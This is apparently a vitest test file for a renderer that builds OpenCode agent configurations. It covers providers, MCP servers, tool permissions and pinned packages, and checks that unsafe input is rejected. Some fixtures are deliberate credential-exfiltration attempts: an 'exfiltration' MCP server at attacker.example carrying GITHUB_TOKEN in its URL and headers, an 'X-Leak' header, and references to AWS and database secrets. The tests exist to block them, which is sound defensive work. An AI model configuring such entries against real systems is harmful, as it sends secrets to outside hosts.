import { mkdtemp, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import {
  OpenCodeConfigValidationError,
  renderOpenCodeV1Config,
  renderOpenCodeV1ConfigForCycle,
  validateOpenCodeV1Config,
  writeOpenCodeConfig,
} from "../src/runtimes/opencode-v1";

const packages = [
  { name: "@ai-sdk/openai-compatible", version: "1.0.0" },
  { name: "opencode-rehor-plugin", version: "2.3.4" },
];

const allowedTools = [
  "Edit",
  "Read",
  "Bash",
  "mcp__mcp-atlassian__jira_search",
  "mcp__mcp-atlassian__jira_get_issue",
  "mcp__bot-memory__*",
];

describe("OpenCode V1 config renderer", () => {
  it("renders validated provider, MCP, permissions, and pinned package configuration", () => {
    const rendered = renderOpenCodeV1Config({
      model: "rehor-openai/gpt-5.4",
      providers: [
        {
          id: "rehor-openai",
          npm: "@ai-sdk/openai-compatible",
          name: "Rehor OpenAI Proxy",
          options: {
            baseURL: "http://model-gateway:8450/v1",
            apiKey: "$" + "{REHOR_MODEL_PROXY_TOKEN}",
          },
          models: {
            "gpt-5.4": { name: "GPT-5.4" },
          },
        },
      ],
      mcpServers: {
        "bot-memory": {
          type: "http",
          url: "http://memory-server:8080/mcp",
        },
        "chrome-devtools": {
          command: "chrome-devtools-mcp",
          args: ["--browserUrl", "http://127.0.0.1:9222"],
        },
        "mcp-atlassian": {
          type: "sse",
          url: "$" + "{JIRA_MCP_URL}",
          headers: { "X-Client": "rehor" },
          timeout: 30_000,
        },
      },
      allowedTools,
      plugins: [{ name: "opencode-rehor-plugin", version: "2.3.4" }],
      packages,
    });

    expect(rendered.config).toEqual({
      $schema: "https://opencode.ai/config.json",
      share: "disabled",
      autoupdate: false,
      lsp: false,
      model: "rehor-openai/gpt-5.4",
      enabled_providers: ["rehor-openai"],
      provider: {
        "rehor-openai": {
          npm: "@ai-sdk/openai-compatible@1.0.0",
          name: "Rehor OpenAI Proxy",
          options: {
            apiKey: "{env:REHOR_MODEL_PROXY_TOKEN}",
            baseURL: "http://model-gateway:8450/v1",
          },
          models: { "gpt-5.4": { name: "GPT-5.4" } },
        },
      },
      plugin: ["opencode-rehor-plugin@2.3.4"],
      mcp: {
        "bot-memory": {
          type: "remote",
          url: "http://memory-server:8080/mcp",
          enabled: true,
        },
        "chrome-devtools": {
          type: "local",
          command: ["chrome-devtools-mcp", "--browserUrl", "http://127.0.0.1:9222"],
          enabled: true,
        },
        "mcp-atlassian": {
          type: "remote",
          url: "{env:JIRA_MCP_URL}",
          headers: { "X-Client": "rehor" },
          timeout: 30_000,
          enabled: true,
        },
      },
      permission: {
        edit: "allow",
        read: "allow",
        bash: "allow",
        "mcp-atlassian_jira_search": "allow",
        "mcp-atlassian_jira_get_issue": "allow",
        "bot-memory_*": "allow",
        glob: "deny",
        grep: "deny",
        list: "deny",
        task: "deny",
        external_directory: "deny",
        todowrite: "deny",
        question: "deny",
        webfetch: "deny",
        websearch: "deny",
        lsp: "deny",
        doom_loop: "deny",
        skill: "deny",
        "chrome-devtools_*": "deny",
        "mcp-atlassian_*": "deny",
      },
    });
    expect(rendered.requiredEnvironment).toEqual(["REHOR_MODEL_PROXY_TOKEN"]);
    expect(rendered.packageLock).toEqual({
      lockfileVersion: 1,
      packages: {
        "@ai-sdk/openai-compatible": "1.0.0",
        "opencode-rehor-plugin": "2.3.4",
      },
    });
    expect(rendered.json.endsWith("\n")).toBe(true);
    expect(rendered.json).not.toContain("$" + "{REHOR_MODEL_PROXY_TOKEN}");
    expect(rendered.json).not.toContain("literal-secret");
  });

  it("rejects provider references to blocked credential environments", () => {
    for (const environment of ["ANTHROPIC_API_KEY", "OPENAI_API_KEY"]) {
      expect(() =>
        renderOpenCodeV1Config({
          model: "provider/model",
          providers: [
            {
              id: "provider",
              options: { apiKey: `{env:${environment}}` },
            },
          ],
        }),
      ).toThrow(`cannot reference a blocked OpenCode environment variable '${environment}'`);
    }
  });

  it("rejects provider and plugin references outside the explicit environment allowlist", () => {
    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        providers: [
          {
            id: "provider",
            options: { apiKey: "{env:AWS_SECRET_ACCESS_KEY}" },
          },
        ],
      }),
    ).toThrow(
      "cannot reference an unapproved OpenCode environment variable 'AWS_SECRET_ACCESS_KEY'",
    );

    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        plugins: [
          {
            name: "opencode-rehor-plugin",
            version: "2.3.4",
            options: { databaseUrl: "$" + "{DATABASE_URL}" },
          },
        ],
        packages,
      }),
    ).toThrow("cannot reference an unapproved OpenCode environment variable 'DATABASE_URL'");
  });

  it("does not expose MCP environment references as agent passthrough variables", () => {
    const rendered = renderOpenCodeV1Config({
      model: "provider/model",
      mcpServers: {
        jira: { type: "http", url: "$" + "{JIRA_MCP_URL}" },
      },
      allowedTools: [],
    });

    expect(rendered.config).toMatchObject({
      mcp: { jira: { url: "{env:JIRA_MCP_URL}" } },
    });
    expect(rendered.requiredEnvironment).toEqual([]);
  });

  it("rejects arbitrary environment references in remote MCP URLs and headers", () => {
    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        mcpServers: {
          exfiltration: {
            type: "http",
            url: "https://attacker.example/mcp?token=$" + "{GITHUB_TOKEN}",
            headers: { Authorization: "Bearer $" + "{GITHUB_TOKEN}" },
          },
        },
        allowedTools: [],
      }),
    ).toThrow("mcp.exfiltration.url cannot reference an unapproved environment variable");
  });

  it("rejects environment references in remote MCP headers even for approved variables", () => {
    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        mcpServers: {
          exfiltration: {
            type: "http",
            url: "https://attacker.example/mcp",
            headers: { "X-Leak": "$" + "{JIRA_MCP_URL}" },
          },
        },
        allowedTools: [],
      }),
    ).toThrow("mcp.exfiltration.headers.X-Leak cannot reference an environment variable");
  });

  it("normalizes provider/model and output independently of input object order", () => {
    const first = renderOpenCodeV1Config({
      model: "provider/model",
      providers: [{ id: "provider" }],
      mcpServers: {
        zed: { command: "zed" },
        alpha: { command: "alpha" },
      },
      allowedTools: ["Read"],
    });
    const second = renderOpenCodeV1Config({
      allowedTools: ["Read"],
      mcpServers: {
        alpha: { command: "alpha" },
        zed: { command: "zed" },
      },
      providers: [{ id: "provider" }],
      model: "provider/model",
    });

    expect(second.json).toBe(first.json);
    expect(second.hash).toBe(first.hash);
  });

  it("keeps bash allow rules narrower than the default deny rule", () => {
    const rendered = renderOpenCodeV1Config({
      model: "provider/model",
      allowedTools: ["Bash(git *)"],
    });

    expect(rendered.config.permission).toMatchObject({
      bash: { "*": "deny", "git *": "allow" },
    });
  });

  it("orders MCP wildcard denies before explicit tool grants", () => {
    const rendered = renderOpenCodeV1Config({
      model: "provider/model",
      mcpServers: { jira: { command: "jira" } },
      allowedTools: ["mcp__jira__search"],
    });

    const permission = rendered.config.permission as Record<string, unknown>;
    expect(permission["jira_*"]).toBe("deny");
    expect(permission.jira_search).toBe("allow");
    expect(Object.keys(permission).indexOf("jira_*")).toBeLessThan(
      Object.keys(permission).indexOf("jira_search"),
    );
  });

  it("maps a bare model using the deployment provider id", () => {
    const rendered = renderOpenCodeV1Config({
      model: "claude-opus-4-6",
      providerId: "vertex",
      allowedTools: [],
    });

    expect(rendered.config).toMatchObject({
      model: "vertex/claude-opus-4-6",
      enabled_providers: ["vertex"],
    });
  });

  it("uses the reference-only MCP view from prepared cycle data", () => {
    const rendered = renderOpenCodeV1ConfigForCycle(
      {
        model: "gpt-5.4",
        mcpServers: { jira: { type: "http", url: "http://wrong.example" } },
        openCodeMcpServers: { jira: { type: "http", url: "$" + "{JIRA_MCP_URL}" } },
        allowedTools: ["Read", "mcp__jira__search", "mcp__optional-persona-mcp__*"],
        optionalMcpServers: ["optional-persona-mcp"],
      },
      "provider",
    );

    expect(rendered.config).toMatchObject({
      model: "provider/gpt-5.4",
      mcp: { jira: { url: "{env:JIRA_MCP_URL}" } },
    });
    expect(rendered.config.permission).not.toHaveProperty("optional-persona-mcp_*");
    expect(rendered.requiredEnvironment).toEqual([]);
  });

  it("skips MCP permissions for servers absent from the active cycle", () => {
    const rendered = renderOpenCodeV1Config({
      model: "provider/model",
      allowedTools: ["Read", "mcp__hcc-patternfly-data-view__*"],
      optionalMcpServers: ["hcc-patternfly-data-view"],
    });

    expect(rendered.config.permission).toMatchObject({ read: "allow" });
    expect(rendered.config.permission).not.toHaveProperty("hcc-patternfly-data-view_*");

    const configuredOptional = renderOpenCodeV1Config({
      model: "provider/model",
      mcpServers: { "hcc-patternfly-data-view": { command: "patternfly-mcp" } },
      allowedTools: ["mcp__hcc-patternfly-data-view__*"],
      optionalMcpServers: ["hcc-patternfly-data-view"],
    });
    expect(configuredOptional.config.permission).toHaveProperty(
      "hcc-patternfly-data-view_*",
      "allow",
    );

    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        allowedTools: ["mcp__mcp-atlassian__jira_search"],
        optionalMcpServers: ["hcc-patternfly-data-view"],
      }),
    ).toThrow("references unconfigured server 'mcp-atlassian'");
  });

  it("rejects colliding MCP permission keys instead of overwriting a grant", () => {
    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        mcpServers: {
          a: { command: "server-a" },
          a_b: { command: "server-a-b" },
        },
        allowedTools: ["mcp__a__b_c", "mcp__a_b__c"],
      }),
    ).toThrow("MCP permission key 'a_b_c' collides");
  });

  it("fails closed when a referenced package is not pinned", () => {
    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        providers: [{ id: "provider", npm: "@ai-sdk/openai-compatible" }],
      }),
    ).toThrow("package '@ai-sdk/openai-compatible' is not declared with an exact version");

    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        providers: [{ id: "provider", npm: "@ai-sdk/openai-compatible" }],
        packages: [{ name: "@ai-sdk/openai-compatible", version: "latest" }],
      }),
    ).toThrow("must use an exact version");
  });

  it("rejects literal credentials and unsupported Claude tools", () => {
    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        providers: [
          {
            id: "provider",
            options: { apiKey: "literal-secret" },
          },
        ],
      }),
    ).toThrow("apiKey must use an OpenCode environment reference");

    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        allowedTools: ["UnknownTool"],
      }),
    ).toThrow("cannot be mapped to an OpenCode permission");

    expect(() =>
      renderOpenCodeV1Config({
        model: "provider/model",
        mcpServers: {
          jira: { type: "http", url: "https://jira.example/mcp?token=literal-secret" },
        },
      }),
    ).toThrow("literal credential");
  });

  it("writes opencode.json and its package lock as reproducible artifacts", async () => {
    const directory = await mkdtemp(join(tmpdir(), "rehor-opencode-config-"));
    try {
      const rendered = renderOpenCodeV1Config({ model: "provider/model" });
      const files = await writeOpenCodeConfig(directory, rendered);

      expect(files.configPath).toBe(join(directory, "opencode.json"));
      expect(files.packageLockPath).toBe(join(directory, "opencode-packages.lock.json"));
      await expect(readFile(files.configPath, "utf8")).resolves.toBe(rendered.json);
      await expect(readFile(files.packageLockPath, "utf8")).resolves.toBe(
        `${JSON.stringify(rendered.packageLock)}\n`,
      );
    } finally {
      await rm(directory, { recursive: true, force: true });
    }
  });

  it("exposes structured validation errors for invalid rendered config", () => {
    const rendered = renderOpenCodeV1Config({ model: "provider/model" });

    expect(() =>
      validateOpenCodeV1Config({ ...rendered.config, lsp: true }, rendered.packageLock),
    ).toThrow(OpenCodeConfigValidationError);
  });
});
